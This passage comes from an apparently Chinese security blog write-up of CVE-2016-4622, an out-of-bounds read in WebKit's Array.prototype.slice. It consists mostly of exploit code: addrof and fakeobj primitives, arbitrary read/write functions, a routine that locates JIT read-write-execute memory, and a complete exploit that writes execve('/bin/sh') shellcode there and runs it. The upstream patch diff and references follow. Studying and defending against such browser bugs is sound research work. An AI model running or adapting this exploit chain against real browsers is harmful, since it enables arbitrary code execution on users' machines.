+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">controller -&gt; +-----------+-----------+</span><br><span class="line">              |   jscell  | butterfly | ---+</span><br><span class="line">              +-----------+-----------+    |</span><br><span class="line">                                           |</span><br><span class="line">controllee -&gt; +-----------+-----------+ &lt;--+</span><br><span class="line">              |   jscell  | butterfly | ---+</span><br><span class="line">              +-----------+-----------+    |</span><br><span class="line">                                           |</span><br><span class="line">   unboxed -&gt; +-----------+-----------+ &lt;--+--&gt; +-----------+-----------+ &lt;- boxed</span><br><span class="line">              |   jscell  | butterfly | ---+    |   jscell  | butterfly | ---+</span><br><span class="line">              +-----------+-----------+    |    +-----------+-----------+    |</span><br><span class="line">                                           |                                 |</span><br><span class="line">              +-----------+-----------+ x--+--&gt; +-----------+-----------+ &lt;--+</span><br><span class="line">              |  memory   |  memory   |         |  memory   |  memory   |</span><br><span class="line">              +-----------+-----------+         +-----------+-----------+</span><br></pre></td></tr></table></figure>
+
+<p>实际构造如下</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">boxed = [&#123;&#125;]; <span class="comment">// ArrayWithContiguous</span></span><br><span class="line">unboxed = [<span class="number">1.23</span>]; <span class="comment">// ArrayWithDouble</span></span><br><span class="line">controller[<span class="number">1</span>] = unboxed; <span class="comment">// controllee's butterfly</span></span><br><span class="line">shared_butterfly = controllee[<span class="number">1</span>]; <span class="comment">// unbox's butterfly</span></span><br><span class="line">controller[<span class="number">1</span>] = boxed; <span class="comment">// controllee's buttefly</span></span><br><span class="line">controllee[<span class="number">1</span>] = shared_butterfly; <span class="comment">// box's butterfly = unbox's butterfly</span></span><br><span class="line">victim.fakeheader = header_ArrayWithDouble;</span><br></pre></td></tr></table></figure>
+
+<h3 id="读写函数"><a href="#读写函数" class="headerlink" title="读写函数"></a>读写函数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">  controller[<span class="number">1</span>] = i2f(addr + <span class="number">0x10</span>);</span><br><span class="line">  boxed[<span class="number">0</span>] = controllee.value;</span><br><span class="line">  <span class="keyword">return</span> f2i(unboxed[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">addr, value</span>) </span>&#123;</span><br><span class="line">  controller[<span class="number">1</span>] = i2f(addr + <span class="number">0x10</span>);</span><br><span class="line">  controllee.value = i2f(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="获取RWX区域"><a href="#获取RWX区域" class="headerlink" title="获取RWX区域"></a>获取RWX区域</h3><p>JIT为可读可写可执行区域,调用路径为</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">+------------------+</span><br><span class="line">| JSFunction       |</span><br><span class="line">+------------------+</span><br><span class="line">| JSCell           |</span><br><span class="line">| m_butterfly      |</span><br><span class="line">| m_scope          |</span><br><span class="line">| m_executable     | -----&gt; +------------------+</span><br><span class="line">| m_rareData       |        | ExecutableBse    |</span><br><span class="line">+------------------+        +------------------+</span><br><span class="line">                            |                  |</span><br><span class="line">                            |                  |</span><br><span class="line">                            |                  |</span><br><span class="line">                            | m_jitCodeForCall | -----&gt; +------------------+</span><br><span class="line">                            |                  |        | JITCode          |</span><br><span class="line">                            +------------------+        +------------------+</span><br><span class="line">                                                        |                  |</span><br><span class="line">                                                        |                  |</span><br><span class="line">                                                        |                  |</span><br><span class="line">                                                        |                  |</span><br><span class="line">                                                        | m_codePtr        | -----&gt; func</span><br><span class="line">                                                        |                  |</span><br><span class="line">                                                        +------------------+</span><br><span class="line">(lldb) p *(JSC::JSFunction *)0x1091688d0                                                      </span><br><span class="line">(JSC::JSFunction) <span class="variable">$3</span> = &#123;                                                                      </span><br><span class="line">  JSC::JSCallee = &#123;                                                                           </span><br><span class="line">    JSC::JSNonFinalObject = &#123;                                                                 </span><br><span class="line">      JSC::JSObject = &#123;                                                                       </span><br><span class="line">        JSC::JSCell = &#123;                                                                       </span><br><span class="line">          m_structureID = 65                                                                  </span><br><span class="line">          m_indexingTypeAndMisc = <span class="string">'\0'</span>                                                        </span><br><span class="line">          m_type = JSFunctionType                                                             </span><br><span class="line">          m_flags = <span class="string">'\x0e'</span>                                                                    </span><br><span class="line">          m_cellState = DefinitelyWhite                                                       </span><br><span class="line">        &#125;                                                                                     </span><br><span class="line">        m_butterfly = (m_value = 0x0000000000000000)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    m_scope = &#123;</span><br><span class="line">      JSC::WriteBarrierBase&lt;JSC::JSScope, WTF::DumbPtrTraits&lt;JSC::JSScope&gt; &gt; = &#123;</span><br><span class="line">        m_cell = 0x00000001091cc000</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  m_executable = &#123;</span><br><span class="line">    JSC::WriteBarrierBase&lt;JSC::ExecutableBase, WTF::PoisonedPtrTraits&lt;WTF::Poison&lt;uintptr_t &amp;&gt;</span><br><span class="line">, JSC::ExecutableBase&gt; &gt; = &#123;</span><br><span class="line">      m_cell = (m_poisonedBits = 4448052512)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  m_rareData = &#123;</span><br><span class="line">    JSC::WriteBarrierBase&lt;JSC::FunctionRareData, WTF::PoisonedPtrTraits&lt;WTF::Poison&lt;uintptr_t </span><br><span class="line">&amp;&gt;, JSC::FunctionRareData&gt; &gt; = &#123;</span><br><span class="line">      m_cell = (m_poisonedBits = 0)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>实际构造如下</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getJIT</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">target</span>(<span class="params">num</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">2</span>; i &lt; num; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (num % i === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">    target(i);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">    target(i);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">    target(i);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> target;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRWXMem</span>(<span class="params">JITFunc</span>) </span>&#123;</span><br><span class="line">  target_addr = addrof(JITFunc);</span><br><span class="line">  target_addr = read(target_addr + <span class="number">0x18</span>);</span><br><span class="line">  target_addr = read(target_addr + <span class="number">0x18</span>);</span><br><span class="line">  target_addr = read(target_addr + <span class="number">0x20</span>);</span><br><span class="line">  <span class="keyword">return</span> target_addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="任意写"><a href="#任意写" class="headerlink" title="任意写"></a>任意写</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">injectShellcode</span>(<span class="params">addr, shellcode</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, len = shellcode.length; i &lt; len; ++i) &#123;</span><br><span class="line">    write(addr + i, shellcode[i].charCodeAt());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line">    a.push(i + <span class="number">0.123</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b = a.slice(<span class="number">0</span>, &#123;</span><br><span class="line">      valueOf: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        a.length = <span class="number">0</span>; </span><br><span class="line">      <span class="keyword">return</span> <span class="number">10</span>; </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line">print(b);</span><br><span class="line"><span class="comment">//0.123,1.123,1.5488838078e-314,1.5488838078e-314,1.5488838078e-314,1.5488838078e-314,1.5488838078e-314,1.5488838078e-314,1.5488838078e-314,1.5488838078e-314</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> u8 = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> u32 = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> BASE = <span class="number">0x100000000</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">  u32[<span class="number">0</span>] = i % BASE;</span><br><span class="line">  u32[<span class="number">1</span>] = i / BASE;</span><br><span class="line">  <span class="keyword">return</span> f64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>) </span>&#123;</span><br><span class="line">  f64[<span class="number">0</span>] = f;</span><br><span class="line">  <span class="keyword">return</span> u32[<span class="number">0</span>] + BASE * u32[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (x &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="string">`-<span class="subst">$&#123;hex(-x)&#125;</span>`</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`0x<span class="subst">$&#123;x.toString(<span class="number">16</span>)&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrof</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">    a.push(i + <span class="number">0.23</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> hax = &#123;</span><br><span class="line">    valueOf: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      a.length = <span class="number">0</span>;</span><br><span class="line">      a = [obj];</span><br><span class="line">      <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;;</span><br><span class="line">  b = a.slice(<span class="number">0</span>, hax);</span><br><span class="line">  <span class="keyword">var</span> addr = b[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">return</span> f2i(addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeobj</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">  addr = i2f(addr);</span><br><span class="line">  <span class="keyword">var</span> a = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">    a.push(&#123;&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> hax = &#123;</span><br><span class="line">    valueOf: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      a.length = <span class="number">0</span>;</span><br><span class="line">      a = [addr];</span><br><span class="line">      <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">var</span> b = a.slice(<span class="number">0</span>, hax);</span><br><span class="line">  <span class="keyword">var</span> obj = b[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getJIT</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">target</span>(<span class="params">num</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">2</span>; i &lt; num; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (num % i === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">    target(i);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">    target(i);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">    target(i);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> target;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">flag_ArrayWithDouble = <span class="number">0x01082107</span>;</span><br><span class="line">flag_ArrayWithCongious = <span class="number">0x01082109</span>;</span><br><span class="line">structure_id = <span class="number">0x200</span>;</span><br><span class="line">u32[<span class="number">0</span>] = structure_id;</span><br><span class="line">u32[<span class="number">1</span>] = flag_ArrayWithDouble;</span><br><span class="line">header_ArrayWithDouble = f64[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">spray = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x2000</span>; i++) &#123;</span><br><span class="line">  temp = [<span class="number">1.1</span>];</span><br><span class="line">  temp.value = <span class="number">2.2</span>;</span><br><span class="line">  temp[<span class="string">"p"</span> + i] = <span class="number">3.3</span>;</span><br><span class="line">  spray.push(temp);</span><br><span class="line">&#125;</span><br><span class="line">controllee = spray[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line">victim = &#123;</span><br><span class="line">  fakeheader: header_ArrayWithDouble,</span><br><span class="line">  controllee_obj: controllee,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">controller_addr = addrof(victim) + <span class="number">0x10</span>;</span><br><span class="line">controller = fakeobj(controller_addr);</span><br><span class="line"></span><br><span class="line">boxed = [&#123;&#125;]; <span class="comment">// ArrayWithContiguous</span></span><br><span class="line">unboxed = [<span class="number">1.23</span>]; <span class="comment">// ArrayWithDouble</span></span><br><span class="line">controller[<span class="number">1</span>] = unboxed; <span class="comment">// controllee's butterfly</span></span><br><span class="line">shared_butterfly = controllee[<span class="number">1</span>]; <span class="comment">// unbox's butterfly</span></span><br><span class="line">controller[<span class="number">1</span>] = boxed; <span class="comment">// controllee's buttefly</span></span><br><span class="line">controllee[<span class="number">1</span>] = shared_butterfly; <span class="comment">// box's butterfly = unbox's butterfly</span></span><br><span class="line">victim.fakeheader = header_ArrayWithDouble;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">  controller[<span class="number">1</span>] = i2f(addr + <span class="number">0x10</span>);</span><br><span class="line">  boxed[<span class="number">0</span>] = controllee.value;</span><br><span class="line">  <span class="keyword">return</span> f2i(unboxed[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">addr, value</span>) </span>&#123;</span><br><span class="line">  controller[<span class="number">1</span>] = i2f(addr + <span class="number">0x10</span>);</span><br><span class="line">  controllee.value = i2f(value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRWXMem</span>(<span class="params">JITFunc</span>) </span>&#123;</span><br><span class="line">  target_addr = addrof(JITFunc);</span><br><span class="line">  target_addr = read(target_addr + <span class="number">0x18</span>);</span><br><span class="line">  target_addr = read(target_addr + <span class="number">0x18</span>);</span><br><span class="line">  target_addr = read(target_addr + <span class="number">0x20</span>);</span><br><span class="line">  <span class="keyword">return</span> target_addr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">injectShellcode</span>(<span class="params">addr, shellcode</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, len = shellcode.length; i &lt; len; ++i) &#123;</span><br><span class="line">    write(addr + i, shellcode[i].charCodeAt());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x48\x31\xf6\x56\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xd2\x48\x31\xc0\xb0\x02\x48\xc1\xc8\x28\xb0\x3b\x0f\x05"</span>;</span><br><span class="line">func = getJIT();</span><br><span class="line">mem = getRWXMem(func);</span><br><span class="line">injectShellcode(mem, shellcode);</span><br><span class="line"></span><br><span class="line">func();</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>程序在进入到fastpath的时候对重新获取数组长度判断长度是否被更改</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// Source/JavaScriptCore/runtime/ArrayPrototype.cpp</span><br><span class="line">@@ -863,7 +863,7 @@ EncodedJSValue JSC_HOST_CALL arrayProtoFuncSlice(ExecState* exec)</span><br><span class="line">     if (UNLIKELY(speciesResult.first == SpeciesConstructResult::Exception))</span><br><span class="line">         return JSValue::encode(jsUndefined());</span><br><span class="line"></span><br><span class="line"><span class="deletion">-     if (LIKELY(speciesResult.first == SpeciesConstructResult::FastPath &amp;&amp; isJSArray(thisObj))) &#123;</span></span><br><span class="line"><span class="addition">+     if (LIKELY(speciesResult.first == SpeciesConstructResult::FastPath &amp;&amp; isJSArray(thisObj) &amp;&amp; length == getLength(exec, thisObj))) &#123;</span></span><br><span class="line">         if (JSArray* result = asArray(thisObj)-&gt;fastSlice(*exec, begin, end - begin))</span><br><span class="line">             return JSValue::encode(result);</span><br><span class="line">     &#125;</span><br><span class="line"> @@ -932,7 +932,7 @@ EncodedJSValue JSC_HOST_CALL arrayProtoFuncSplice(ExecState* exec)</span><br><span class="line">         return JSValue::encode(jsUndefined());</span><br><span class="line"></span><br><span class="line">     JSObject* result = nullptr;</span><br><span class="line"><span class="deletion">-     if (speciesResult.first == SpeciesConstructResult::FastPath &amp;&amp; isJSArray(thisObj))</span></span><br><span class="line"><span class="addition">+     if (speciesResult.first == SpeciesConstructResult::FastPath &amp;&amp; isJSArray(thisObj) &amp;&amp; length == getLength(exec, thisObj))</span></span><br><span class="line">         result = asArray(thisObj)-&gt;fastSlice(*exec, begin, deleteCount);</span><br><span class="line"></span><br><span class="line">     if (!result) &#123;</span><br></pre></td></tr></table></figure>
+
+<h2 id="LINK"><a href="#LINK" class="headerlink" title="LINK"></a>LINK</h2><p><a href="https://github.com/WebKit/webkit/commit/650552a6ed7cac8aed3f53dd464341728984b82f" target="_blank" rel="noopener">Crash: Array.prototype.slice() and .splice() can call fastSlice() aft…</a></p>
+<p><a href="https://www.anquanke.com/post/id/183882#h2-0" target="_blank" rel="noopener">JavaScript engine exploit（三）</a></p>
+<p><a href="http://phrack.com/papers/attacking_javascript_engines.html" target="_blank" rel="noopener">Attacking JavaScript Engines: A case study of JavaScriptCore and CVE-2016-4622</a></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://abcdefghijklmnopqrst.xyz">骑麦兜看落日</a>
+            <p>原文链接：<a href="http://abcdefghijklmnopqrst.xyz/2020/04/19/Vuln_CVE_2016_4622_WebKit_Array_slice_OOB_access/">http://abcdefghijklmnopqrst.xyz/2020/04/19/Vuln_CVE_2016_4622_WebKit_Array_slice_OOB_access/</a>
+            <p>发表日期：<a href="http://abcdefghijklmnopqrst.xyz/2020/04/19/Vuln_CVE_2016_4622_WebKit_Array_slice_OOB_access/">April 19th 2020, 9:00:00 pm</a>
+            <p>更新日期：<a href="http://abcdefghijklmnopqrst.xyz/2020/04/19/Vuln_CVE_2016_4622_WebKit_Array_slice_OOB_access/">April 19th 2020, 9:00:00 pm</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2020/04/19/Vuln_BUG_191731_WebKit_RegExp_lastIndex_TypeConfusion/" title= "[Vuln]BUG-191731 WebKit RegExp lastIndex TypeConfusion">
+                    <div class="nextTitle">[Vuln]BUG-191731 WebKit RegExp lastIndex TypeConfusion</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/12/09/Binary_Iot设备如何拿到调试shell/" title= "[Binary]Iot设备如何拿到调试shell">
+                    <div class="prevTitle">[Binary]Iot设备如何拿到调试shell</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+    <div id="lv-container" data-id="city" data-uid= MTAyMC8zNzY1OS8xNDE5MA==>
+        <script type="text/javascript">
+            (function (d, s) {
+                var j, e = d.getElementsByTagName(s)[0];
